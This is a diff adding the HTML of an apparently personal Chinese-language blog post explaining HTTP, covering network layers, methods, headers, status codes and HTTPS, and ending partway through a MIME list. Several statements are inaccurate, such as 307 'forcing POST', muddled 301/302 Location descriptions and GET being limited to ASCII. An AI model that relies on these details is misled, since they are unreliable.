@@ -1,0 +1,1379 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="English">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Http,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="HTTP HTTP Hyper Text Transfer Protocol（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。   HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计">
+<meta name="keywords" content="Http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Http">
+<meta property="og:url" content="https://supremeyh.github.io/2019/01/27/Http/Http/index.html">
+<meta property="og:site_name" content="Supremeyh">
+<meta property="og:description" content="HTTP HTTP Hyper Text Transfer Protocol（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。   HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计">
+<meta property="og:locale" content="English">
+<meta property="og:updated_time" content="2019-07-23T01:25:36.322Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Http">
+<meta name="twitter:description" content="HTTP HTTP Hyper Text Transfer Protocol（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。   HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://supremeyh.github.io/2019/01/27/Http/Http/">
+
+
+
+
+
+  <title>Http | Supremeyh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="English">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Supremeyh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">a paradise for sharing knowledge and ideas</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://supremeyh.github.io/2019/01/27/Http/Http/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Supremeyh">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Supremeyh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Http</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-27T06:52:14+08:00">
+                2019-01-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Http/" itemprop="url" rel="index">
+                    <span itemprop="name">Http</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><blockquote>
+<p>HTTP Hyper Text Transfer Protocol（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。</p>
+</blockquote>
+<blockquote>
+<p>HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。</p>
+</blockquote>
+<blockquote>
+<p>HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型。支持客户/服务器模式, 只能客户端发起请求，服务器回送响应; 简单快速：客户向服务器请求服务时，只需传送请求方法和路径, 通信速度很快; 灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记; 无连接, 限制每次连接只处理一个请求, 服务器处理完客户的请求，并收到客户的应答后，即断开连接; 无状态, HTTP是一个无状态的协议，服务器不会在两个请求之间保留任何数据（状态）。而使用HTTP的头部扩展，HTTP Cookies就可以解决这个问题。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。注意，HTTP本质是无状态的，使用Cookies可以创建有状态的会话。</p>
+</blockquote>
+<blockquote>
+<p>HTTP协议通常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。默认HTTP的端口号为80，HTTPS的端口号为443。</p>
+</blockquote>
+<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>一次HTTP操作称为一个事务，其工作过程可分为四步：客户机与服务器需要建立连接；客户机发送请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容；服务器响应请求；客户端显示信息，断开连接。</p>
+<h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>浏览器向服务器发出连接请求 SYN，seq:X （x=0）；<br>服务器回应了浏览器的请求，并要求确认 SYN，ACK，此时seq：y（y为0），ACK：x+1（为1）；<br>浏览器回应了服务器的确认，连接成功 ACK，此时seq：x+1（为1），ACK：y+1（为1）。</p>
+<h3 id="浏览器输入URL后http请求返回的完整过程"><a href="#浏览器输入URL后http请求返回的完整过程" class="headerlink" title="浏览器输入URL后http请求返回的完整过程"></a>浏览器输入URL后http请求返回的完整过程</h3><p>Redirect -&gt; App cache应用缓存 -&gt; DNS 解析（域名对应ip地址）-&gt; 创建TCP连接 (三次握手) -&gt; Request发送请求 -&gt; Response接收响应</p>
+<h3 id="OSI（Open-System-Interconnect），即开放式系统互联七层模型（一个理想的模型）："><a href="#OSI（Open-System-Interconnect），即开放式系统互联七层模型（一个理想的模型）：" class="headerlink" title="OSI（Open System Interconnect），即开放式系统互联七层模型（一个理想的模型）："></a>OSI（Open System Interconnect），即开放式系统互联七层模型（一个理想的模型）：</h3><ul>
+<li>物理层Physical Layer： 比特流的传输。实际最终信号的传输是通过物理层实现的,通过物理介质传输比特流, 规定了电平、速度和电缆针脚。常用各种物理设备,集线器、中继器、调制解调器、网线、双绞线、同轴电缆。相当于快递寄送过程中的交通工具，如汽车，火车，飞机，船。</li>
+<li>数据链路层Data Link La  yer: 介质访问接入。负责建立和管理节点间的链路。通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。分为介质访问控制（MAC）和逻辑链路控制（LLC）两个子层。如网桥、以太交换机、网卡。</li>
+<li>网络层Network Layer，即IP协议层：路由寻址。通过路由选择算法，为报文或分组通过通信子网选择最适当的路径，控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。寻址、交换、 路由算法、连接服务。如路由器。相当于快递公司庞大的快递网络，全国不同的集散中心</li>
+<li>传输层Transport Layer：端到端的连接。向用户提供可靠的端到端的差错和流量控制，负责传输连接管理、处理传输差错和监控服务质量，保证报文的正确传输，向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。OSI下3层的主要任务是数据通信(通信子网的功能)，上3层的任务是数据处理(资源子网的功能)。常见的协议：TCP、UDP协议、Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议. 该层是通信子网和资源子网的接口和桥梁，起到承上启下的作用。相当于投递员。</li>
+<li>会话层Session Layer：主机间的通信。组织和协调两个会话进程之间的通信，并对数据交换进行管理。相当于公司的外联部。</li>
+<li>表示层Presentation Layer：数据的表示。对来自应用层的命令和数据进行解释，对各种语法赋予相应的含义，如编码、数据格式转换和加解密等，并按照一定的格式传送给会话层。相当于公司文秘翻译。</li>
+<li>应用层Application Layer：处理网络应用。提供应用接口，也为用户直接提供各种网络服务。常见应用层的网络服务协议有HTTP，HTTPS，FTP，POP3、SMTP等。<br>对等通信，为了使数据分组从源传送到目的地，源端OSI模型的每一层都必须与目的端的对等层进行通信，这种通信方式称为对等层通信。在每一层通信过程中，使用本层自己协议进行通信。</li>
+</ul>
+<h3 id="TCP-IP五层模型"><a href="#TCP-IP五层模型" class="headerlink" title="TCP/IP五层模型"></a>TCP/IP五层模型</h3><ul>
+<li>物理层、数据链路层、网络层、传输层、应用层(对应OSI的会话层、表示层和应用层)</li>
+</ul>
+<h3 id="HTTP1-1版本新特性"><a href="#HTTP1-1版本新特性" class="headerlink" title="HTTP1.1版本新特性"></a>HTTP1.1版本新特性</h3><p>默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求；管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应；断点续传原理</p>
+<h3 id="http2与http1-1区别"><a href="#http2与http1-1区别" class="headerlink" title="http2与http1.1区别"></a>http2与http1.1区别</h3><p>信道复用； server push ; 所有数据二进制传输； 同一连接里面发送多个请求不再需要按照顺序； 头信息压缩以及分帧传输</p>
+<h3 id="GET方法与POST方法的区别"><a href="#GET方法与POST方法的区别" class="headerlink" title="GET方法与POST方法的区别"></a>GET方法与POST方法的区别</h3><p>1、get重点在从服务器上获取资源，post重点在向服务器发送数据；2、get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，多个请求数据间用”&amp;”连接，这个过程用户是可见的；post将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；3、Get传输的数据量小，因为受URL长度限制，但效率较高；Post可以传输大量数据，所以上传文件时只能用Post方式；4、get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；post较get安全性较高；5、get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。post支持标准字符集，可以正确传递中文字符。</p>
+<h3 id="常用的HTTP方法有哪些？"><a href="#常用的HTTP方法有哪些？" class="headerlink" title="常用的HTTP方法有哪些？"></a>常用的HTTP方法有哪些？</h3><ul>
+<li>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器。</li>
+<li>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。</li>
+<li>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。</li>
+<li>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。</li>
+<li>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。</li>
+<li>OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求, 查询相应URI支持的HTTP方法。</li>
+<li>TRACE: 请求服务器回送收到的请求信息，主要用于测试或诊断</li>
+<li>CONNECT: 保留将来使用</li>
+</ul>
+<h3 id="http请求由三部分组成，分别是：请求行、消息报头、请求正文"><a href="#http请求由三部分组成，分别是：请求行、消息报头、请求正文" class="headerlink" title="http请求由三部分组成，分别是：请求行、消息报头、请求正文"></a>http请求由三部分组成，分别是：请求行、消息报头、请求正文</h3><p>请求报文包含三部分：<br>a、请求行(起始行start-line）：包含请求方法、URI、HTTP版本信息。 GET /test/hi.txt HTTP/1.0<br>b、请求首部字段 Headers<br>c、请求内容主体 Body</p>
+<p>响应报文包含三部分：<br>a、状态行(status line)：包含HTTP版本、状态码、状态码的原因短语. HTTP/1.0 200 OK<br>b、响应首部字段 Headers<br>c、响应内容主体 Body</p>
+<p>HTTP/2 帧： HTTP/2 引入了一个额外的步骤：它将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 多路复用 (multiplexing) 的过程，它允许更有效的底层 TCP 连接。</p>
+<h3 id="常见HTTP首部字段"><a href="#常见HTTP首部字段" class="headerlink" title="常见HTTP首部字段"></a>常见HTTP首部字段</h3><p>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</p>
+<ul>
+<li>Date：创建报文时间</li>
+<li>Connection：连接的管理</li>
+<li>Cache-Control：缓存指令, 缓存指令是单向、独立的,响应中出现的缓存指令在请求中未必会出现,一个消息的缓存指令不会影响另一个消息处理的缓存机制。<br>请求时的缓存指令包括：no-cache（用于指示请求或响应消息不能缓存）、no-store、max-age、max-stale、min-fresh、only-if-cached;<br>响应时的缓存指令包括：public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age、s-maxage.</li>
+<li>Transfer-Encoding：报文主体的传输编码方式<br>b、请求首部字段（请求报文会使用的首部字段）</li>
+<li>Host：请求资源所在服务器</li>
+<li>Accept：可处理的媒体类型</li>
+<li>Accept-Charset：可接收的字符集</li>
+<li>Accept-Encoding：可接受的内容编码</li>
+<li>Accept-Language：可接受的自然语言<br>c、响应首部字段（响应报文会使用的首部字段）</li>
+<li>Accept-Ranges：可接受的字节范围</li>
+<li>Location：令客户端重新定向到的URI</li>
+<li>Server：HTTP服务器的安装信息<br>d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）</li>
+<li>Allow：资源可支持的HTTP方法</li>
+<li>Content-Type：实体主类的类型</li>
+<li>Content-Encoding：实体主体适用的编码方式</li>
+<li>Content-Language：实体主体的自然语言</li>
+<li>Content-Length：实体主体的的字节数</li>
+<li>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</li>
+<li>X-Content-Type-Options: nosiff  禁用客户端的 MIME 类型嗅探行为</li>
+<li>X-Frame-OptionsEdit: DENY(表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许) / SAMEORIGIN(表示该页面可以在相同域名页iframe 中展示) / ALLOW-FROM uri (表示该页面可以在指定来源的 frame 中展示)</li>
+<li>X-XSS-Protection: 0 (禁止XSS过滤) / 1; mode=block (当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面)</li>
+</ul>
+<h3 id="协议升级机制"><a href="#协议升级机制" class="headerlink" title="协议升级机制"></a>协议升级机制</h3><p>HTTP协议 提供了一种特殊的机制，这一机制允许将一个已建立的连接升级成新的、不相容的协议。需要添加两项额外的header：<br>Connection: Upgrade， 设置 Connection 头的值为 “Upgrade” 来指示这是一个升级请求.<br>Upgrade: protocols， Upgrade 头指定一项或多项协议名，按优先级排序，以逗号分隔。</p>
+<h3 id="常见的HTTP相应状态码"><a href="#常见的HTTP相应状态码" class="headerlink" title="常见的HTTP相应状态码"></a>常见的HTTP相应状态码</h3><p>返回的状态</p>
+<ul>
+<li>1xx：Informational 指示信息–表示请求已接收，继续处理</li>
+<li>2xx：Success 成功–表示请求已被成功接收、理解、接受</li>
+<li>3xx：Redirection 重定向–信息不完整，要进行更进一步的补充</li>
+<li>4xx：Client Error 客户端错误–请求有语法错误或请求无法实现</li>
+<li><p>5xx：Server Error 服务器端错误–服务器未能实现合法的请求</p>
+</li>
+<li><p>100 Continue 继续, 客户端必须继续发出请求</p>
+</li>
+<li>101 Switching Protocols 交换协议, 客户端要求服务器根据请求转换HTTP协议版本</li>
+<li><p>102 Processing 处理</p>
+</li>
+<li><p>200 OK, 请求被正常处理</p>
+</li>
+<li>201 Created 创建, 请求成功并且服务器创建了新的资源</li>
+<li>202 Accepted 已接受, 但尚未处理</li>
+<li>203 Non-Authoritative Information 非授权信息, 服务器已成功处理了请求，但返回的信息可能来自另一来源</li>
+<li>204 No Content 无内容,  请求收到，但返回信息为空</li>
+<li>205 Reset Content 重置内容, 服务器完成了请求，重置文档视图(例如，清除表单内容以输入新内容)</li>
+<li>206 Partial Content 部分内容, 服务器已经完成了部分用户的GET请求</li>
+<li>207 Multi-Status 多状态</li>
+<li>208 Already Reported 已报告</li>
+<li><p>226 IMIM Used 使用的</p>
+</li>
+<li><p>300 Multiple Choices 多种选择, 请求的资源可在多处得到</p>
+</li>
+<li>301 Moved Permanently , 永久性重定向, 在Location响应首部的值仍为当前URL(隐式重定向)。使用301要慎重，一旦使用，服务端更改路由设置，用户如果不清理浏览器缓存，就会一直重定向。</li>
+<li>302 Found, 临时重定向, 在Location响应首部的值仍为新的URL(显示重定向)。每次请求仍然需要经过服务端指定跳转地址</li>
+<li>303 See Other ,建议客户端访问其他URL或访问方式,能通过GET方法重定向到另一个URI上</li>
+<li>304 Not Modified, 请求的资源没有改变 可以继续使用缓存</li>
+<li>305 Use Proxy 使用代理</li>
+<li>306 Switch Proxy 开关代理, 前一版本HTTP中使用的代码，现行版本中不再使用</li>
+<li>307 Temporary Redirect , 临时重定向，与302类似，只是强制要求使用POST方法</li>
+<li><p>308 Permanent Redirect 永久重定向</p>
+</li>
+<li><p>400 Bad Request 错误的请求, 服务器不理解请求的语法; 网站服务未启动</p>
+</li>
+<li>401 Unauthorized 未授权, 请求要求身份验证。对于需要登录的网页，服务器可能返回此响应</li>
+<li>402 Payment Required 需要付费</li>
+<li>403 Forbidden 服务器拒绝访问</li>
+<li>404 Not Found 服务器找不到请求的网页</li>
+<li>405 Method Not Allowed 不允许的方法</li>
+<li>406 Not Acceptable 不可接受</li>
+<li>407 Proxy Authentication Required 代理服务器需要身份验证, 与 401（未授权）类似，但指定请求者应当授权使用代理</li>
+<li>408 Request Timeout 请求超时</li>
+<li>409 Conflict 冲突, 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。</li>
+<li>410 Gone 已删除, 如果请求的资源已永久删除，服务器就会返回此响应</li>
+<li>411 Length Required 需要长度, 服务器不接受不含有效内容长度标头字段的请求</li>
+<li>412 Precondition Failed 前提条件失败, 服务器未满足请求者在请求中设置的其中一个前提条件</li>
+<li>413 Payload Too Large 负载过大</li>
+<li>414 URI Too Long 太长</li>
+<li>415 Unsupported Media Type 不支持的媒体类型, 请求的格式不受请求页面的支持</li>
+<li>416 Range Not Satisfiable 的范围不合适, 如果页面无法提供请求的范围，则服务器会返回此状态代码</li>
+<li>417 Expectation Failed 预期失败, 服务器未满足”期望”请求标头字段的要求</li>
+<li>418 I’m a teapot 我是一个茶壶</li>
+<li>421 Misdirected Request 误导请求</li>
+<li>422 Unprocessable Entity 无法处理的实体</li>
+<li>423 Locked 锁定</li>
+<li>424 Failed Dependency 失败的依赖</li>
+<li>426 Upgrade Required 升级所需</li>
+<li>428 Precondition Required 所需的先决条件</li>
+<li>429 Too Many Requests 太多的请求</li>
+<li>431 Request Header Fields Too Large 请求头字段太大</li>
+<li>451 Unavailable For Legal Reasons 不可出于法律原因</li>
+<li><p>499 网络繁忙，同一个ip过来的过多请求直接中断</p>
+</li>
+<li><p>500 Internal Server Error 内部服务器错误</p>
+</li>
+<li>501 Not Implemented 未执行, 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码</li>
+<li>502 Bad Gateway 错误的网关, 服务器作为网关或代理，从上游服务器收到无效响应。</li>
+<li>503 Service Unavailable 服务不可用, 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。</li>
+<li>504 Gateway Timeout 网关超时, 服务器作为网关或代理，但是没有及时从上游服务器收到请求</li>
+<li>505 HTTP Version Not Supported 不支持HTTP版本</li>
+<li>506 Variant Also Negotiates 变体也进行协商</li>
+<li>507 Insufficient Storage 存储空间不足</li>
+<li>508 Loop Detected 检测到循环</li>
+<li>510 Not Extended 不延长</li>
+<li>511 Network Authentication Required 网络需要身份验证</li>
+</ul>
+<h3 id="URI、URL和URN"><a href="#URI、URL和URN" class="headerlink" title="URI、URL和URN"></a>URI、URL和URN</h3><ul>
+<li>URI：Uniform Resource Identifier，即统一资源标志符，用来唯一的标识一个资源。</li>
+<li>URL：Uniform Resource Locator，统一资源定位符, 也叫Web地址。即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</li>
+<li>URN：Uniform Resource Name，统一资源命名。即通过名字来表示资源的。<br>格式： <a href="http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument" target="_blank" rel="noopener">http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument</a>.<br>protocol方案或协议(http://) + domain name主机(<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a>) + port端口(:80) + path路径(/path/to/myfile.html) + parameters查询(?key1=value1&amp;key2=value2) + anchor片段(#SomewhereInTheDocument)</li>
+</ul>
+<h3 id="HTTP的缺点与HTTPS"><a href="#HTTP的缺点与HTTPS" class="headerlink" title="HTTP的缺点与HTTPS"></a>HTTP的缺点与HTTPS</h3><p>a、通信使用明文不加密，内容可能被窃听；<br>b、不验证通信方身份，可能遭到伪装；<br>c、无法验证报文完整性，可能被篡改。<br>HTTPS就是HTTP加上加密处理（一般是SSL安全通信线路）+认证+完整性保护</p>
+<h3 id="HTTP优化"><a href="#HTTP优化" class="headerlink" title="HTTP优化"></a>HTTP优化</h3><p>利用负载均衡优化和加速HTTP应用；利用HTTP Cache来优化网站</p>
+<h3 id="curl-利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具"><a href="#curl-利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具" class="headerlink" title="curl 利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具"></a>curl 利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具</h3><p>curl [option] [url]<br>如 curl -v baidu.com<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">* Rebuilt URL to: www.baidu.com/</span><br><span class="line">*   Trying 61.135.169.125...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to www.baidu.com (61.135.169.125) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: www.baidu.com</span><br><span class="line">&gt; User-Agent: curl/7.54.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform</span><br><span class="line">&lt; Connection: Keep-Alive</span><br><span class="line">&lt; Content-Length: 2381</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Date: Mon, 26 Nov 2018 13:59:17 GMT</span><br><span class="line">&lt; Etag: &quot;588604c4-94d&quot;</span><br><span class="line">&lt; Last-Modified: Mon, 23 Jan 2017 13:27:32 GMT</span><br><span class="line">&lt; Pragma: no-cache</span><br><span class="line">&lt; Server: bfe/1.0.8.18</span><br><span class="line">&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/</span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><blockquote>
+<p>HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。<br>HTTPS协议的主要作用可以分为两种：确认网站的真实性；建立一个信息安全通道，来保证数据传输的安全。<br>区别主要如下：1、https协议需要ca申请证书，需要费用。 2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。3、完全不同的连接方式和端口，http是80，https是443。　4、http的连接很简单，无状态；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。<br>缺点: 1、HTTPS协议握手阶段比较费时，会使页面的加载时间延长近50%，增加10%到20%的耗电；2、HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗，甚至已有的安全措施也会因此而受到影响；3、SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用。4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。5、HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
+</blockquote>
+<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><blockquote>
+<p>多用途Internet邮件扩展（MIME）类型 是一种标准化的方式来表示文档的性质和格式。浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理文档。<br>通用结构: type/subtype, 大小写不敏感，但是传统写法都是小写</p>
+<ul>
+<li>text/plain    文本文件默认值</li>
+<li>text/html    HTML内容</li>
+<li>text/css    CSS文件</li>
